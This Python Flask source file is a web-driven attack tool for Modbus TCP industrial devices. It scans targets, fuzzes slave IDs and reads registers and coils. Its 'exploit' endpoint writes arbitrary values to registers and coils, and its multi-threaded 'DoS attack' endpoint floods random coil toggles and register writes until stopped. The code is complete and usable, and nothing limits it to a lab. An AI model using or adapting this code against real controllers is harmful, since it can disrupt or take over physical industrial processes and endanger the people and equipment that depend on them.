from flask import Flask, render_template, request, jsonify
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusIOException, ConnectionException
import threading
import traceback
import time
import json
import random
import socket
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__, static_folder='static', template_folder='templates')

# Store the current scan status and progress
scan_in_progress = False
scan_progress = {"status": "idle", "progress": 0, "message": ""}
scan_thread = None
dos_attack_running = False
dos_thread = None
# Store scan results globally
scan_results = {"status": "no_results", "message": "No scan results available"}


def update_progress(status, progress, message=""):
    global scan_progress
    scan_progress = {"status": status, "progress": progress, "message": message}

# Helper function to make results JSON-serializable
def sanitize_results(results_dict):
    """Make sure all values in the dictionary are JSON serializable"""
    clean_results = {}
    for key, value in results_dict.items():
        if isinstance(value, dict):
            clean_results[key] = sanitize_results(value)
        elif isinstance(value, (str, int, float, bool, type(None))):
            clean_results[key] = value
        else:
            # Convert non-serializable types to string
            clean_results[key] = str(value)
    return clean_results

def check_modbus_available(ip, port, timeout=2):
    """Test if Modbus TCP is running on target"""
    try:
        # Test 1: Simple socket connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        if result != 0:
            return False, "Port not open"
        
        # Test 2: Modbus TCP connection
        client = ModbusTcpClient(ip, port=port, timeout=timeout)
        if not client.connect():
            client.close()
            return False, "Cannot establish Modbus TCP connection"
        
        # Test 3: Basic read request (may or may not work depending on slave ID)
        try:
            # Try with default slave ID 1
            rr = client.read_holding_registers(0, count=1, slave=1)
            if not rr.isError():
                client.close()
                return True, "Modbus TCP running and responding to queries"
        except:
            pass
        
        client.close()
        return True, "Modbus TCP running but requires valid slave ID"
        
    except Exception as e:
        return False, str(e)

def discover_slave_ids(ip, port, results, id_range=(1, 255)):
    """Discover valid slave IDs through fuzzing"""
    valid_ids = []
    total_ids = id_range[1] - id_range[0] + 1
    progress_step = 10  # Update progress every 10 IDs
    
    update_progress("discovering", 0, f"Discovering slave IDs ({id_range[0]}-{id_range[1]})")
    
    client = ModbusTcpClient(ip, port=port, timeout=1)
    if not client.connect():
        results["error"] = "Connection failed during slave ID discovery"
        update_progress("failed", 100, "Connection failed")
        return []
    
    try:
        for i, slave_id in enumerate(range(id_range[0], id_range[1] + 1)):
            if not scan_in_progress:
                break
                
            # Try multiple function codes for more reliable discovery
            functions_to_try = [
                (client.read_holding_registers, 0, 1),  # Function code 3
                (client.read_coils, 0, 1),              # Function code 1
                (client.read_discrete_inputs, 0, 1),    # Function code 2
                (client.read_input_registers, 0, 1)     # Function code 4
            ]
            
            for func, addr, count in functions_to_try:
                try:
                    response = func(addr, count=count, slave=slave_id)
                    # If we get a normal response or a specific exception (not timeout/connection error)
                    # it indicates the slave ID exists
                    if not isinstance(response, ModbusIOException) or response.fcode not in [0x0A, 0x0B]:
                        valid_ids.append(slave_id)
                        break
                except:
                    # Continue to next function on exception
                    continue
            
            # Update progress periodically
            if i % progress_step == 0 or i == total_ids - 1:
                progress = int((i + 1) / total_ids * 100)
                update_progress("discovering", progress, 
                               f"Discovering slave IDs: {i+1}/{total_ids} checked, {len(valid_ids)} found")
                time.sleep(0.01)  # Small delay to prevent flooding
    
    except Exception as e:
        results["error"] = f"Error during slave ID discovery: {str(e)}"
    
    finally:
        client.close()
    
    return valid_ids

def scan_modbus(target_ip, target_port, slave_id, start_address, end_address, scan_options, results):
    global scan_in_progress, scan_results
    scan_in_progress = True
    results["status"] = "running"
    
    # Check if Modbus is running first
    update_progress("testing", 0, f"Testing if Modbus is running on {target_ip}:{target_port}")
    modbus_available, message = check_modbus_available(target_ip, target_port)
    results["modbus_check"] = {"available": modbus_available, "message": message}
    
    if not modbus_available:
        results["status"] = "failed"
        results["error"] = message
        update_progress("failed", 100, f"Modbus not available: {message}")
        scan_in_progress = False
        scan_results = sanitize_results(results)
        return
    
    # Run slave ID discovery if requested
    if scan_options.get("discover_slave_ids"):
        update_progress("discovering", 10, "Starting slave ID discovery")
        id_range = (int(scan_options.get("slave_id_start", 1)), int(scan_options.get("slave_id_end", 255)))
        valid_ids = discover_slave_ids(target_ip, target_port, results, id_range)
        results["discovered_slave_ids"] = valid_ids
        
        if not scan_in_progress:  # Check if scan was canceled during discovery
            results["status"] = "aborted"
            update_progress("aborted", 100, "Scan aborted by user")
            scan_in_progress = False
            scan_results = sanitize_results(results)
            return
            
        # If no specific scanning options are selected, we're done
        if not any([scan_options.get(opt) for opt in 
                  ["scan_registers", "scan_coils", "scan_discrete_inputs", "scan_input_registers"]]):
            results["status"] = "completed"
            update_progress("completed", 100, f"Slave ID discovery completed. Found {len(valid_ids)} valid IDs.")
            scan_in_progress = False
            scan_results = sanitize_results(results)
            return
    
    update_progress("connecting", 20, f"Connecting to {target_ip}:{target_port}")
    
    client = ModbusTcpClient(target_ip, port=target_port, timeout=3)
    
    try:
        if not client.connect():
            results["error"] = "Connection failed! Check IP and Port."
            update_progress("failed", 100, "Connection failed")
            scan_in_progress = False
            scan_results = sanitize_results(results)
            return

        # Calculate range and handle large scans
        count = end_address - start_address + 1
        max_registers_per_request = 125  # Modbus limitation

        # Track which scan types are selected
        scan_types = []
        if scan_options.get("scan_registers"): scan_types.append("Holding Registers")
        if scan_options.get("scan_coils"): scan_types.append("Coils")
        if scan_options.get("scan_discrete_inputs"): scan_types.append("Discrete Inputs")
        if scan_options.get("scan_input_registers"): scan_types.append("Input Registers")
        
        total_operations = len(scan_types)
        operations_completed = 0

        # Process scan in chunks to handle large ranges
        if scan_options.get("scan_registers"):
            results["Holding Registers"] = {}
            for chunk_start in range(start_address, end_address + 1, max_registers_per_request):
                if not scan_in_progress:
                    results["status"] = "aborted"
                    break
                
                chunk_count = min(max_registers_per_request, end_address - chunk_start + 1)
                update_progress("scanning", 20 + (operations_completed / total_operations) * 60, 
                               f"Reading holding registers {chunk_start}-{chunk_start + chunk_count - 1}")
                
                try:
                    rr = client.read_holding_registers(chunk_start, count=chunk_count, slave=slave_id)
                    if not rr.isError():
                        for i, value in enumerate(rr.registers):
                            addr = chunk_start + i
                            results["Holding Registers"][str(addr)] = value
                    else:
                        results["Holding Registers"][f"Error {chunk_start}-{chunk_start + chunk_count - 1}"] = str(rr)
                except Exception as e:
                    results["Holding Registers"][f"Error {chunk_start}-{chunk_start + chunk_count - 1}"] = str(e)
                
                # Check if scan was stopped
                if not scan_in_progress:
                    break
                    
                time.sleep(0.1)  # Small delay to prevent overloading the target
            
            operations_completed += 1

        if scan_options.get("scan_coils") and scan_in_progress:
            results["Coils"] = {}
            max_coils_per_request = 2000  # Different limit for coils
            
            for chunk_start in range(start_address, end_address + 1, max_coils_per_request):
                if not scan_in_progress:
                    results["status"] = "aborted"
                    break
                    
                chunk_count = min(max_coils_per_request, end_address - chunk_start + 1)
                update_progress("scanning", 20 + (operations_completed / total_operations) * 60, 
                               f"Reading coils {chunk_start}-{chunk_start + chunk_count - 1}")
                
                try:
                    rr = client.read_coils(chunk_start, count=chunk_count, slave=slave_id)
                    if not rr.isError():
                        for i, value in enumerate(rr.bits):
                            addr = chunk_start + i
                            results["Coils"][str(addr)] = value
                    else:
                        results["Coils"][f"Error {chunk_start}-{chunk_start + chunk_count - 1}"] = str(rr)
                except Exception as e:
                    results["Coils"][f"Error {chunk_start}-{chunk_start + chunk_count - 1}"] = str(e)
                
                # Check if scan was stopped
                if not scan_in_progress:
                    break
                    
                time.sleep(0.1)  # Small delay
            
            operations_completed += 1

        if scan_options.get("scan_discrete_inputs") and scan_in_progress:
            results["Discrete Inputs"] = {}
            max_inputs_per_request = 2000  # Similar to coils
            
            for chunk_start in range(start_address, end_address + 1, max_inputs_per_request):
                if not scan_in_progress:
                    results["status"] = "aborted"
                    break
                    
                chunk_count = min(max_inputs_per_request, end_address - chunk_start + 1)
                update_progress("scanning", 20 + (operations_completed / total_operations) * 60, 
                               f"Reading discrete inputs {chunk_start}-{chunk_start + chunk_count - 1}")
                
                try:
                    rr = client.read_discrete_inputs(chunk_start, count=chunk_count, slave=slave_id)
                    if not rr.isError():
                        for i, value in enumerate(rr.bits):
                            addr = chunk_start + i
                            results["Discrete Inputs"][str(addr)] = value
                    else:
                        results["Discrete Inputs"][f"Error {chunk_start}-{chunk_start + chunk_count - 1}"] = str(rr)
                except Exception as e:
                    results["Discrete Inputs"][f"Error {chunk_start}-{chunk_start + chunk_count - 1}"] = str(e)
                    
                # Check if scan was stopped
                if not scan_in_progress:
                    break
                    
                time.sleep(0.1)  # Small delay
            
            operations_completed += 1

        if scan_options.get("scan_input_registers") and scan_in_progress:
            results["Input Registers"] = {}
            
            for chunk_start in range(start_address, end_address + 1, max_registers_per_request):
                if not scan_in_progress:
                    results["status"] = "aborted"
                    break
                    
                chunk_count = min(max_registers_per_request, end_address - chunk_start + 1)
                update_progress("scanning", 20 + (operations_completed / total_operations) * 60, 
                               f"Reading input registers {chunk_start}-{chunk_start + chunk_count - 1}")
                
                try:
                    rr = client.read_input_registers(chunk_start, count=chunk_count, slave=slave_id)
                    if not rr.isError():
                        for i, value in enumerate(rr.registers):
                            addr = chunk_start + i
                            results["Input Registers"][str(addr)] = value
                    else:
                        results["Input Registers"][f"Error {chunk_start}-{chunk_start + chunk_count - 1}"] = str(rr)
                except Exception as e:
                    results["Input Registers"][f"Error {chunk_start}-{chunk_start + chunk_count - 1}"] = str(e)
                
                # Check if scan was stopped
                if not scan_in_progress:
                    break
                    
                time.sleep(0.1)  # Small delay
            
            operations_completed += 1

        if scan_in_progress:
            results["status"] = "completed"
            update_progress("completed", 100, "Scan completed")
        else:
            results["status"] = "aborted"
            update_progress("aborted", 100, "Scan aborted by user")

    except Exception as e:
        results["error"] = str(e)
        update_progress("error", 100, f"Error: {str(e)}")

    finally:
        client.close()
        scan_in_progress = False
        # Update the global results with sanitized values
        scan_results = sanitize_results(results)

def exploit_modbus(target_ip, target_port, slave_id, exploit_options, results):
    client = ModbusTcpClient(target_ip, port=target_port, timeout=3)

    try:
        client.connect()
        if not client.connected:
            results["error"] = "Failed to connect to Modbus server."
            return

        if exploit_options.get("write_register"):
            address = int(exploit_options["register_address"])
            value = int(exploit_options["register_value"])
            rr = client.write_register(address, value, slave=slave_id)
            results["Write Register"] = {
                "address": address,
                "value": value,
                "status": "Success" if not rr.isError() else "Failed",
                "details": str(rr) if rr.isError() else ""
            }

        if exploit_options.get("write_coil"):
            address = int(exploit_options["coil_address"])
            value = exploit_options["coil_value"].lower() == "true"
            rr = client.write_coil(address, value, slave=slave_id)
            results["Write Coil"] = {
                "address": address,
                "value": value,
                "status": "Success" if not rr.isError() else "Failed",
                "details": str(rr) if rr.isError() else ""
            }

        results["status"] = "completed"

    except Exception as e:
        results["error"] = str(e)
        results["status"] = "error"

    finally:
        client.close()

def dos_attack_worker(target_ip, target_port, slave_id, attack_type, address, rate, results, attack_id):
    """Worker function for DoS attack thread"""
    
    # Ensure all parameters are properly converted to correct types
    try:
        address = int(address)
        slave_id = int(slave_id)
        rate = float(rate)
    except ValueError as e:
        results[attack_id] = {"status": "error", "message": f"Type conversion error: {str(e)}"}
        return

    client = ModbusTcpClient(target_ip, port=target_port, timeout=1)
    
    try:
        if not client.connect():
            results[attack_id] = {"status": "failed", "message": "Connection failed"}
            return
            
        start_time = time.time()
        request_count = 0
        error_count = 0
        
        while dos_attack_running:
            try:
                if attack_type == "write_coil":
                    # Toggle between True and False
                    value = bool(random.randint(0, 1))
                    rr = client.write_coil(address, value, slave=slave_id)
                elif attack_type == "write_register":
                    # Random value within register range
                    value = random.randint(0, 65535)
                    rr = client.write_register(address, value, slave=slave_id)
                
                request_count += 1
                if rr.isError():
                    error_count += 1
                    
                if rate > 0:
                    time.sleep(1/rate)
                    
            except Exception as e:
                error_count += 1
                # Re-establish connection if lost
                try:
                    client.close()
                    client.connect()
                except:
                    pass
                    
                time.sleep(0.5)  # Delay before retrying
        
        duration = time.time() - start_time
        results[attack_id] = {
            "status": "completed",
            "duration": round(duration, 2),
            "requests": request_count,
            "errors": error_count,
            "rate": round(request_count / duration, 2) if duration > 0 else 0
        }
            
    except Exception as e:
        results[attack_id] = {"status": "error", "message": str(e)}
        import traceback
        results[attack_id]["traceback"] = traceback.format_exc()
        
    finally:
        client.close()
def dos_attack(target_ip, target_port, slave_id, attack_options, results):
    """Execute DoS attack with multiple threads"""
    global dos_attack_running, dos_thread
    
    dos_attack_running = True
    threads = []
    attack_results = {}
    
    try:
        # Configure number of threads based on intensity
        # Ensure proper type conversion for all numeric values
        intensity = int(attack_options.get("intensity", 1))
        thread_count = min(max(1, intensity), 10)  # Limit to 10 threads max
        
        # Configure request rate per thread - convert to float
        rate_per_thread = float(attack_options.get("rate", 10))
        
        # Convert slave_id to int here to ensure it's not passed as a string
        slave_id = int(slave_id)
        
        if attack_options.get("dos_write_coil"):
            address = int(attack_options.get("dos_coil_address", 0))
            for i in range(thread_count):
                thread = threading.Thread(
                    target=dos_attack_worker,
                    args=(target_ip, target_port, slave_id, "write_coil", address, 
                          rate_per_thread, attack_results, f"coil_thread_{i}")
                )
                thread.daemon = True
                thread.start()
                threads.append(thread)
        
        if attack_options.get("dos_write_register"):
            address = int(attack_options.get("dos_register_address", 0))
            for i in range(thread_count):
                thread = threading.Thread(
                    target=dos_attack_worker,
                    args=(target_ip, target_port, slave_id, "write_register", address, 
                          rate_per_thread, attack_results, f"register_thread_{i}")
                )
                thread.daemon = True
                thread.start()
                threads.append(thread)
        
        # If duration is specified, sleep for that time before stopping
        duration = int(attack_options.get("duration", 0))
        if duration > 0:
            time.sleep(duration)
            dos_attack_running = False
            
            # Wait for all threads to complete
            for thread in threads:
                thread.join(timeout=2)
            
            results["status"] = "completed"
            results["attack_results"] = attack_results
        else:
            # If no duration specified, return immediately and let attack run
            results["status"] = "running"
            dos_thread = threads
            
    except Exception as e:
        dos_attack_running = False
        results["status"] = "error"
        results["error"] = str(e)
        # Add traceback for debugging
        import traceback
        results["traceback"] = traceback.format_exc()
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/scan', methods=['POST'])
def scan():
    global scan_in_progress, scan_thread, scan_results
    if scan_in_progress:
        return jsonify({"status": "error", "message": "A scan is already in progress!"}), 400

    data = request.json
    
    # Validate required fields
    if not data.get("ip"):
        return jsonify({"status": "error", "message": "Target IP is required!"}), 400
    
    try:
        ip = data.get("ip")
        port = int(data.get("port", 502))
        slave_id = int(data.get("slave_id", 1))
        start_address = int(data.get("start_address", 0))
        end_address = int(data.get("end_address", 10))
        
        # Validate address range
        if end_address < start_address:
            return jsonify({"status": "error", "message": "End address must be greater than or equal to start address!"}), 400
        
        if end_address - start_address > 10000:
            return jsonify({"status": "error", "message": "Address range too large! Maximum range is 10,000 addresses."}), 400
        
        # Check scan options
        scan_options = {
            "scan_registers": data.get("scan_registers", False),
            "scan_coils": data.get("scan_coils", False),
            "scan_discrete_inputs": data.get("scan_discrete_inputs", False),
            "scan_input_registers": data.get("scan_input_registers", False),
            "discover_slave_ids": data.get("discover_slave_ids", False),
            "slave_id_start": data.get("slave_id_start", 1),
            "slave_id_end": data.get("slave_id_end", 255)
        }
        
        # Either slave ID discovery or at least one scan option must be selected
        if not scan_options["discover_slave_ids"] and not any([
            scan_options["scan_registers"], 
            scan_options["scan_coils"], 
            scan_options["scan_discrete_inputs"],
            scan_options["scan_input_registers"]
        ]):
            return jsonify({"status": "error", "message": "Select at least one scan option or enable slave ID discovery!"}), 400
        
        results = {}
        scan_thread = threading.Thread(target=scan_modbus, args=(ip, port, slave_id, start_address, end_address, scan_options, results))
        scan_thread.daemon = True
        scan_thread.start()
        
        return jsonify({"status": "started", "message": "Scan started successfully!", "scan_id": str(time.time())})
        
    except ValueError as e:
        return jsonify({"status": "error", "message": f"Invalid input: {str(e)}"}), 400
    except Exception as e:
        return jsonify({"status": "error", "message": f"Error: {str(e)}"}), 500

@app.route('/modbus_test', methods=['POST'])
def modbus_test():
    data = request.json
    
    if not data.get("ip"):
        return jsonify({"status": "error", "message": "Target IP is required!"}), 400
    
    try:
        ip = data.get("ip")
        port = int(data.get("port", 502))
        
        modbus_available, message = check_modbus_available(ip, port)
        
        return jsonify({
            "status": "success",
            "modbus_available": modbus_available,
            "message": message
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": f"Error: {str(e)}"}), 500

@app.route('/scan_status', methods=['GET'])
def scan_status():
    global scan_progress
    return jsonify(scan_progress)

@app.route('/scan_results', methods=['GET'])
def scan_results():
    global scan_in_progress, scan_thread, scan_results
    
    if scan_in_progress and scan_thread and scan_thread.is_alive():
        return jsonify({"status": "in_progress", "message": "Scan still in progress"})
    
    # Return the global results which are now guaranteed to be JSON serializable
    return jsonify(scan_results)

@app.route('/stop_scan', methods=['POST'])
def stop_scan():
    global scan_in_progress
    if scan_in_progress:
        scan_in_progress = False
        update_progress("stopping", 95, "Stopping scan...")
        return jsonify({"status": "stopping", "message": "Stopping scan..."})
    else:
        return jsonify({"status": "not_running", "message": "No scan is currently running."})

@app.route('/exploit', methods=['POST'])
def exploit():
    data = request.json
    
    # Validate required fields
    if not data.get("ip"):
        return jsonify({"status": "error", "message": "Target IP is required!"}), 400
    
    try:
        ip = data.get("ip")
        port = int(data.get("port", 502))
        slave_id = int(data.get("slave_id", 1))
        
        # Check if any exploit option is selected
        exploit_options = {
            "write_register": data.get("write_register", False),
            "register_address": data.get("register_address", 0),
            "register_value": data.get("register_value", 0),
            "write_coil": data.get("write_coil", False),
            "coil_address": data.get("coil_address", 0),
            "coil_value": data.get("coil_value", "false")
        }
        
        if not (exploit_options["write_register"] or exploit_options["write_coil"]):
            return jsonify({"status": "error", "message": "Select at least one exploit option!"}), 400
        
        if exploit_options["write_register"] and (not exploit_options["register_address"] or not exploit_options["register_value"]):
            return jsonify({"status": "error", "message": "Register address and value are required!"}), 400
            
        if exploit_options["write_coil"] and not exploit_options["coil_address"]:
            return jsonify({"status": "error", "message": "Coil address is required!"}), 400
        
        results = {}
        exploit_thread = threading.Thread(target=exploit_modbus, args=(ip, port, slave_id, exploit_options, results))
        exploit_thread.daemon = True
        exploit_thread.start()
        exploit_thread.join()
        
        # Sanitize results before returning
        sanitized_results = sanitize_results(results)
        return jsonify(sanitized_results)
        
    except ValueError as e:
        return jsonify({"status": "error", "message": f"Invalid input: {str(e)}"}), 400
    except Exception as e:
        return jsonify({"status": "error", "message": f"Error: {str(e)}"}), 500

@app.route('/dos_attack', methods=['POST'])
def dos_attack_route():
    global dos_attack_running, dos_thread
    
    # Stop any running DoS attack first
    if dos_attack_running:
        dos_attack_running = False
        if dos_thread:
            for thread in dos_thread:
                if thread.is_alive():
                    thread.join(timeout=2)
        dos_thread = None
    
    data = request.json
    
    # Validate required fields
    if not data.get("ip"):
        return jsonify({"status": "error", "message": "Target IP is required!"}), 400
    
    try:
        ip = data.get("ip")
        port = int(data.get("port", 502))
        slave_id = int(data.get("slave_id", 1))
        
        # Attack options - ensure all numeric values are properly type-converted
        attack_options = {
            "dos_write_coil": data.get("dos_write_coil", False),
            "dos_coil_address": int(data.get("dos_coil_address", 0)),
            "dos_write_register": data.get("dos_write_register", False),
            "dos_register_address": int(data.get("dos_register_address", 0)),
            "intensity": int(data.get("intensity", 1)),  # 1-10 scale for thread count
            "rate": float(data.get("rate", 10.0)),  # Requests per second per thread
            "duration": int(data.get("duration", 0))  # Duration in seconds, 0 = run until stopped
        }
        
        # Validate attack options
        if not (attack_options["dos_write_coil"] or attack_options["dos_write_register"]):
            return jsonify({"status": "error", "message": "Select at least one DoS attack method!"}), 400
        
        results = {}
        dos_thread = threading.Thread(target=dos_attack, args=(ip, port, slave_id, attack_options, results))
        dos_thread.daemon = True
        dos_thread.start()
        
        # If duration is set, wait for completion
        if attack_options["duration"] > 0:
            dos_thread.join()
            # Sanitize results before returning
            sanitized_results = sanitize_results(results)
            return jsonify(sanitized_results)
        else:
            # Otherwise return immediately
            return jsonify({"status": "started", "message": "DoS attack started"})
        
    except ValueError as e:
        return jsonify({"status": "error", "message": f"Invalid input: {str(e)}"}), 400
    except Exception as e:
        import traceback
        error_traceback = traceback.format_exc()
        print(f"DoS attack error: {error_traceback}")
        return jsonify({"status": "error", "message": f"Error: {str(e)}", "traceback": error_traceback}), 500
        
@app.route('/stop_dos_attack', methods=['POST'])
def stop_dos_attack():
    global dos_attack_running, dos_thread
    
    if dos_attack_running:
        dos_attack_running = False
        return jsonify({"status": "stopping", "message": "Stopping DoS attack..."})
    else:
        return jsonify({"status": "not_running", "message": "No DoS attack is currently running."})

@app.route('/dos_status', methods=['GET'])
def dos_status():
    global dos_attack_running
    
    if dos_attack_running:
        return jsonify({"status": "running", "message": "DoS attack is running"})
    else:
        return jsonify({"status": "stopped", "message": "No DoS attack is running"})

@app.errorhandler(Exception)
def handle_exception(e):
    import traceback
    print("[GLOBAL ERROR]", traceback.format_exc())
    return {"status": "error", "message": str(e), "trace": traceback.format_exc()}, 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
